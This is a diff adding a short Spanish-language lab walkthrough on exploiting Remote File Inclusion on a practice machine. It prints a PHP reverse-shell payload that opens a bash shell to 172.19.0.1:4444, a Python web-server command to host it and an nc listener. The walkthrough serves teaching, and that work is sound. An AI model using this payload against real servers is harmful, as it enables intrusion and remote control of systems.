@@ -1,0 +1,20 @@
+	Esta máquina tiene una vulnerabilidad llamada Remote File Inclusion (RFI). La vulnerabilidad RFI ocurre
+	cuando una aplicación web permite al usuario incluir archivos remotos. Esto puede ser explotado para ejecutar
+	código arbitrario en el servidor. Observamos un formulario en el que nos solicita una URL, introducimos la de 
+	google por ejemplo y vemos como llegamos a su pagina a través de esta.
+
+	Tenemos varias formas de explotar esta vulnerabilidad, ya que es vulnerable a lfi también. Se va a explicar la
+	más sencilla. Creamos un archivo index.html en nuestra máquina que contenga una shell reversa:
+
+	<?php
+	exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/172.19.0.1/4444 0>&1'");
+	?>
+
+	Después, ejecutamos un servidor web en la carpeta del index, por ejemplo con python y ponemos nc en escucha:
+
+	python3 -m http.server 8080
+
+	nc -lnvp 4444
+
+	Ahora, si introducimos nuestra URL en el formulario la página vulnerable nos solicitará el index y lanzará la 
+	shell remota.
